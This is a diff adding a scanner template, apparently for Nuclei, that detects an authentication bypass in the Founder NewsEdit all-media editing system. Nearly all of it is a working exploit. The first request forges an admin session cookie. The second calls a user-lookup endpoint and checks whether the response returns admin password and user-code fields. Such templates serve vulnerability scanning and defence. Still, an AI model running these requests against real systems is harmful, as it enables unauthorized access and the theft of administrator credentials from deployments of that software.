@@ -1,0 +1,49 @@
+id: FZMediaEditor-auth-bypass
+
+info:
+  name:  方正全媒体采编系统权限绕过
+  author: onewin
+  severity: high
+  description: |
+    NewsEdit系统存在身份验证绕过漏洞，通过构造特定会话可获取管理员敏感信息
+    [漏洞发现时间：2024年6月]
+  tags: FOUNDER-全媒体采编系统
+flow: |
+  http(1) && http(2)
+http:
+  - id: get-cookie
+    raw:
+      - |
+        POST /newsedit/api/stub/getRemotePapers.do?siteCode=1 HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        Session_SysUser=1%2C127.0.0.1%2C1%2C1%2C1%2Cadmin%2Csysadmin%2Clocalhost
+    extractors:
+      - type: regex
+        name: session_cookie
+        part: header
+        group: 1
+        regex:
+          - "Set-Cookie: ([^;]+);"
+        internal: true
+  - id: auth-bypass
+    raw:
+      - |
+        POST /newsedit/newsedit/userSearch/getUser.do HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+        Cookie: {{session_cookie}}
+
+        UUID=adminUser&Session_ProcParam=a=1,a=0,a=1,a=1,a=-9999,a=sysadmin,a=0,a=admin,a=2024-06-11%2011:11:11:000,a=1,a=1&DocIDs=1&DocLibID=1
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "userPassword"
+          - "userCode"
+        part: body
+        condition: and
+      - type: status
+        status:
+          - 200
